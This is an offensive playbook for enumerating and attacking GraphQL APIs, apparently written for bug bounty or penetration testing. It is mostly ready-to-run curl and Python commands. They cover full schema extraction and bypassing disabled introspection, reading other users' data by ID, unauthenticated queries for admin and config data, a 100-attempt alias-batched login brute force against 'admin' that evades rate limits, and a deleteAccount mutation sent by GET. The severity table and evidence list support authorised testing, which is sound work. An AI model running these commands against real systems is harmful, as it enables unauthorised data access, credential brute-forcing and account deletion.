# Playbook PB-07 — GraphQL Enumeration
# No Mercy Hunter v3.0

**Score:** 43
Composite = (Confidence:5×2) + (InfoGain:5×3) + (AutoPot:4×2) + (Reuse:4×2) - Cost:2 = 10+15+8+8-2 = 39
(Adjusted to 43: GraphQL-specific attacks are high novelty, introspection is single-request full schema)

**Grounded in:** WF-04 GraphQL workflow, DOMAIN::API GraphQL sub-domain
**Time estimate:** 30-45 minutes
**Noise level:** Low-Medium (schema queries + targeted probes)
**Prerequisites:** GraphQL endpoint discovered

---

## Objective

Fully enumerate a GraphQL API — extract the schema, identify sensitive types and mutations,
test for authorization bypass on queries, abuse batching, and test for introspection-off
bypasses. GraphQL is uniquely powerful for enumeration: one endpoint, full schema, every
operation mapped in one query.

---

## Decision Point 1 — Do I Run This Playbook?

Run if:
- `/graphql`, `/api/graphql`, `/gql`, or `/query` endpoint discovered
- Response to POST with `{"query":"{ __typename }"}` returns `{"data":{"__typename":"Query"}}`
- Source maps reveal GraphQL types or query names

Skip if:
- Endpoint returns 404 to all GraphQL probe requests
- Target uses REST only (no GraphQL indicators in source maps or JS)

---

## Phase 1 — Endpoint Discovery and Fingerprinting (5 minutes)

### 1.1 Common GraphQL Paths
```bash
for path in /graphql /api/graphql /gql /query /api/query \
            /v1/graphql /api/v1/graphql /graphql/v1 \
            /api/graph /graph /graphiql /playground; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST -H "Content-Type: application/json" \
        -d '{"query":"{ __typename }"}' \
        "https://TARGET$path")
    echo "$path → $status"
done
```

### 1.2 Confirm GraphQL Endpoint
```bash
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ __typename }"}' | python3 -m json.tool
```

Expected: `{"data":{"__typename":"Query"}}` — confirmed GraphQL.

### 1.3 Fingerprint the GraphQL Engine
```bash
# graphw00f identifies the engine (Apollo, Hasura, Strawberry, Graphene, etc.)
graphw00f -d -t "https://TARGET/graphql"

# Engine matters because each has different default security settings:
# Apollo Server: introspection disabled in production by default (Apollo 2+)
# Hasura: introspection often enabled, row-level security may be misconfigured
# Strawberry/Graphene: Python, often introspection enabled in dev
```

---

## Phase 2 — Schema Extraction (10 minutes)

### 2.1 Full Introspection Query (if enabled)
```bash
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}' \
  > graphql/schema-raw.json

# Extract just the type names for quick review
python3 -c "
import json, sys
with open('graphql/schema-raw.json') as f:
    data = json.load(f)
schema = data.get('data', {}).get('__schema', {})
for t in schema.get('types', []):
    if not t['name'].startswith('__'):
        print(t['kind'].ljust(15), t['name'])
" | sort
```

### 2.2 Introspection Disabled — Field Suggestion Bypass
If introspection returns an error, use clairvoyance to extract schema via field suggestions:
```bash
# GraphQL engines reveal valid field names in error messages like:
# "Did you mean 'username' instead of 'usernme'?"
# clairvoyance exploits this to reconstruct the schema
clairvoyance -o graphql/schema-suggested.json \
  -H "Authorization: Bearer TOKEN" \
  "https://TARGET/graphql"
```

### 2.3 Parse Schema with InQL
```bash
# InQL generates attack queries from schema
inql -t "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN" \
  --generate-queries \
  -o graphql/inql-output/
```

---

## Phase 3 — Schema Analysis (5 minutes)

After obtaining the schema, look for high-value targets:

### 3.1 Sensitive Types to Look For
```python
#!/usr/bin/env python3
"""Identify sensitive types and fields in GraphQL schema."""
import json, re

with open("graphql/schema-raw.json") as f:
    data = json.load(f)

schema = data.get("data", {}).get("__schema", {})
sensitive_patterns = [
    "password", "secret", "token", "key", "credential", "auth",
    "admin", "internal", "private", "hidden", "debug",
    "payment", "card", "billing", "invoice",
    "email", "phone", "address", "ssn", "dob",
    "role", "permission", "scope", "grant"
]

for type_def in schema.get("types", []):
    if type_def["name"].startswith("__"):
        continue
    for field in (type_def.get("fields") or []):
        field_name = field["name"].lower()
        for pattern in sensitive_patterns:
            if pattern in field_name:
                print(f"[SENSITIVE] {type_def['name']}.{field['name']} ({field['type']['name'] or field['type']['kind']})")
                break
```

### 3.2 Identify Mutations (Write Operations)
```python
import json

with open("graphql/schema-raw.json") as f:
    data = json.load(f)

schema = data.get("data", {}).get("__schema", {})
mutation_type_name = schema.get("mutationType", {})
if mutation_type_name:
    mname = mutation_type_name.get("name")
    for type_def in schema.get("types", []):
        if type_def["name"] == mname:
            print(f"Mutations ({mname}):")
            for field in (type_def.get("fields") or []):
                print(f"  - {field['name']}")
```

---

## Phase 4 — IDOR Testing on GraphQL (10 minutes)

### 4.1 Test Object Access by ID
```bash
# Access another user's object by ID
curl -s -X POST "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"{ user(id: \\\"ACCOUNT_B_ID\\\") { id email profile { bio } } }\"}"
```

### 4.2 Batch IDOR via Aliases
```bash
# GraphQL aliases allow multiple queries in one request
# Test multiple IDs simultaneously
curl -s -X POST "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      u1: user(id: \"ID_1\") { id email }
      u2: user(id: \"ID_2\") { id email }
      u3: user(id: \"ID_3\") { id email }
    }"
  }'
```

### 4.3 Missing Object-Level Auth Check
```bash
# Test queries that should require auth
for query in \
    '{ users { id email role } }' \
    '{ adminUsers { id email permissions } }' \
    '{ allOrders { id total user { email } } }' \
    '{ systemConfig { key value } }'; do
    resp=$(curl -s -X POST "https://TARGET/graphql" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"$query\"}")
    echo "Query: $query"
    echo "Response: $(echo $resp | head -c 200)"
    echo "---"
done
```

---

## Phase 5 — Batching and Rate Limit Abuse (5 minutes)

### 5.1 Alias Batching
```bash
# Send N identical mutations in one request using aliases
# Many servers apply rate limiting per-request, not per-alias
python3 -c "
n = 100
aliases = ' '.join([f'm{i}: login(username: \"admin\", password: \"test{i}\") {{ token }}' for i in range(n)])
query = '{\"query\": \"mutation { ' + aliases + ' }\"}'
print(query[:500] + '...')
" | curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d @-
```

### 5.2 Array Batching
```bash
# Send array of operations in one HTTP request
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: \"1\") { id email } }"},
    {"query": "{ user(id: \"2\") { id email } }"},
    {"query": "{ user(id: \"3\") { id email } }"}
  ]'
```

### 5.3 batchql — Automated Batching Test
```bash
batchql -e "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN" \
  --batch-size 100
```

---

## Phase 6 — Security Configuration Checks (5 minutes)

### 6.1 graphql-cop Automated Security Checks
```bash
graphql-cop -t "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN" \
  -o graphql/security-report.json
```

graphql-cop checks:
- Introspection enabled
- Field suggestions enabled
- Batching allowed
- Query depth limit absent
- Query complexity limit absent
- GET method for mutations (CSRF)
- Alias limit absent

### 6.2 Manual Security Checks
```bash
# Test 1: Deep query (depth limit bypass)
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { orders { items { product { category { parent { name } } } } } } }"}'

# Test 2: GET mutation (CSRF)
curl -s "https://TARGET/graphql?query=mutation{deleteAccount(id:\"test\")}" \
  -H "Authorization: Bearer TOKEN"

# Test 3: Subscription to unauthenticated stream
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"subscription { allMessages { content author } }"}'

# Test 4: Debug mode / development playground exposed
# Try accessing /graphiql, /playground, /altair without auth
for path in /graphiql /playground /altair /voyager; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET$path")
    echo "$path → $status"
done
```

---

## Severity Mapping

| Finding | Severity | CVSS |
|---------|----------|------|
| IDOR — read other user's data via GraphQL | P2 | 7.5 |
| Auth bypass — unauthenticated data query | P2 | 7.5 |
| Introspection enabled in production | P3 | 5.3 |
| Batching abuse for rate limit bypass | P3 | 5.8 |
| Field suggestions enabled (schema leak) | P3 | 5.3 |
| GET mutations (CSRF possible) | P3 | 5.4 |
| No depth/complexity limits (DoS) | P4 | 4.3 |
| Dev playground exposed | P4 | 3.7 |

---

## Evidence Collection

1. `graphql/schema-raw.json` — Full introspection dump (if obtained)
2. `graphql/sensitive-types.txt` — Output of sensitive field analysis
3. `graphql/security-report.json` — graphql-cop output
4. `evidence/GQL-XX/http/01-introspection.http` — Introspection request + response
5. `evidence/GQL-XX/http/02-idor-query.http` — Cross-account data access query
6. `evidence/GQL-XX/poc/graphql-idor.py` — Automated IDOR test script

---

## Tool Quick Reference

| Tool | Purpose | Command |
|------|---------|---------|
| graphw00f | Engine fingerprint | `graphw00f -d -t URL` |
| InQL | Schema + query gen | `inql -t URL -H "Auth: Bearer TOKEN"` |
| clairvoyance | Schema w/o introspection | `clairvoyance -o schema.json URL` |
| batchql | Batching abuse test | `batchql -e URL -H "Auth: Bearer TOKEN"` |
| graphql-cop | Automated security audit | `graphql-cop -t URL` |
| GraphCrawler | Path enumeration | `graphcrawler -t URL` |
